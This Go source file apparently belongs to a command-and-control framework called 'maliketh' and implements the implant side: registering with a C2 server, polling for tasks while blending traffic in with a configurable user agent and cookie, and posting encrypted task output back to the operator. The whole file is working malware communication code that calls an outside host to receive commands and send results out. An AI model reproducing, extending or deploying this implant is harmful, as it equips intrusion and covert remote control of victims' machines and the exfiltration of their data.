package implant

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"

	. "maliketh/pkg/config"
	"maliketh/pkg/crypto"

	//"maliketh/pkg/http"
	"maliketh/pkg/models"
	. "maliketh/pkg/utils"

	"emperror.dev/errors"
)

// Register registers the implant with the C2 server at the given URL
func Register(serverUrl string, publicKeyB64 string, privateKeyB64 string) (models.MalleableProfile, error) {

	// Decode the public key
	_, err := base64.StdEncoding.DecodeString(publicKeyB64)
	if err != nil {
		return models.MalleableProfile{}, errors.Wrap(err, "Failed to decode public key")
	}

	// Encrypt our public key with the register password
	encPubKey, err := crypto.EncryptSecretBoxBase64([]byte(publicKeyB64), C2_REGISTER_PASSWORD)
	if err != nil {
		return models.MalleableProfile{}, errors.Wrap(err, "Failed to encrypt public key")
	}

	// Encode encrypted public key to a json object
	res := map[string]string{"txid": encPubKey}
	encPubKeyJson, err := json.Marshal(res)
	if err != nil {
		return models.MalleableProfile{}, errors.Wrap(err, "Failed to encode encrypted public key to json")
	}

	// Send
	//resp, err := http.HTTPRequest("POST", serverUrl, "/c2/register", 80, REGISTER_USER_AGENT, nil, encPubKeyJson, false)
	request, err := http.NewRequest("POST", fmt.Sprintf("%s:%d/c2/register", serverUrl, C2_PORT), bytes.NewReader(encPubKeyJson))
	if err != nil {
		return models.MalleableProfile{}, errors.Wrap(err, "Failed to create request")
	}

	request.Header.Set("User-Agent", REGISTER_USER_AGENT)
	request.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(request)
	if err != nil {
		return models.MalleableProfile{}, errors.Wrap(err, "Failed to send request")
	}

	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return models.MalleableProfile{}, errors.Wrap(err, "Failed to read response body")
	}
	DebugPrintln(fmt.Sprintf("Response: %s", body))

	// JSON decode the response
	var resJson map[string]interface{}
	err = json.Unmarshal([]byte(body), &resJson)
	if err != nil {
		return models.MalleableProfile{}, errors.Wrap(err, "Failed to decode response")
	}

	status := resJson["status"].(bool)
	config := resJson["c"].(string) // Config is still encrypted and base64 encoded

	serverPublicKey := resJson["k"].(string)
	if !status {
		return models.MalleableProfile{}, errors.New("Failed to register")
	}

	decryptedConfig, _ := crypto.DecryptB64String(config, serverPublicKey, privateKeyB64)
	DebugPrintln(fmt.Sprintf("Decrypted config: %s", decryptedConfig))

	return models.ParseMalleableProfile(decryptedConfig, privateKeyB64)
}

func Checkin(c2Url string, profile models.MalleableProfile) (models.Task, error) {
	// Create a new HTTP client
	client := &http.Client{}

	// Create a new HTTP request
	req, err := http.NewRequest("GET", fmt.Sprintf("%s:%d/c2/checkin", c2Url, C2_PORT), nil)
	if err != nil {
		return models.Task{}, errors.Wrap(err, "Failed to create request")
	}

	// Set the user agent
	req.Header.Set("User-Agent", profile.Config.UserAgent)
	req.AddCookie(&http.Cookie{Name: profile.Config.Cookie, Value: profile.ImplantId})

	// Send the request
	resp, err := client.Do(req)

	// Check for errors
	if err != nil {
		return models.Task{}, errors.Wrap(err, "Failed to send request")
	}

	// Read the response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return models.Task{}, errors.Wrap(err, "Failed to read response body")
	}

	// Decode/Decrypt the response body
	bodyDecoded, ok := crypto.DecryptB64String(string(body), profile.Config.Base64ServerPublicKey, profile.Config.Base64EncryptionKey)
	if !ok {
		return models.Task{}, errors.New("Failed to decrypt response")
	}

	// Return the response body
	return models.ParseTask(string(bodyDecoded))
}

func SendTaskResult(taskId string, success bool, output string, serverUrl string, profile models.MalleableProfile) error {
	DebugPrintln(fmt.Sprintf("Sending result of task %s: %s", taskId, output))
	/* format
		b64(encrypt(
			{
	        	"status": bool,
	        	"tid": taskId,
	        	"output": "base64 encoded results"
	    	}
		))
	*/
	toSend := make(map[string]any)

	toSend["status"] = success
	toSend["tid"] = taskId
	toSend["output"] = base64.StdEncoding.EncodeToString([]byte(output)) // base64 encode the output

	m, err := json.Marshal(toSend)
	if err != nil {
		return err
	}

	encryptedResults, err := crypto.EncryptStringToBase64(string(m), profile.Config.Base64ServerPublicKey, profile.Config.Base64EncryptionKey)
	if err != nil {
		return errors.Wrap(err, "error encrypting task results")
	}

	// Send results
	request, err := http.NewRequest("POST", fmt.Sprintf("%s:%d/c2/task", serverUrl, C2_PORT), bytes.NewReader([]byte(encryptedResults)))
	request.AddCookie(&http.Cookie{Name: profile.Config.Cookie, Value: profile.ImplantId})

	if err != nil {
		return errors.Wrap(err, "error building request")
	}

	client := &http.Client{}
	resp, err := client.Do(request)
	DebugPrintln("Response code: %s", resp.Status)
	if err != nil {
		return errors.Wrap(err, "Failed to send request")
	}
	defer resp.Body.Close()

	return nil
}
